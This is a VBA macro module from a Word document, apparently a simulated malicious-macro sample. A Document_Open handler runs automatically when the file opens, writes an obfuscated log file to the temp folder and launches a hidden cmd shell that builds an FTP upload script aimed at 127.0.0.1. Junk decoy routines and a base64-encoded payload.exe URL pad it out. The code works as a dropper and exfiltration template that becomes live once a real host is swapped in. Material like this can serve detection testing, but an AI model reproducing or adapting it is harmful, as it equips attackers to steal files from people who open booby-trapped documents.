
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Integer, logPath As String
    logPath = Environ("TEMP") & "\obl" & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(108) & Chr(111) & "g.txt"
    frs0swbone = FreeFile
    Open logPath For Output As #frs0swbone
    Print #frs0swbone, "marker" & "-ftp-log:" & " simula" & "ted e" & "xfiltr" & "ation" & " data"
    Close #frs0swbone
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\oblivio" & "nx_ftp.t" & "xt", 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
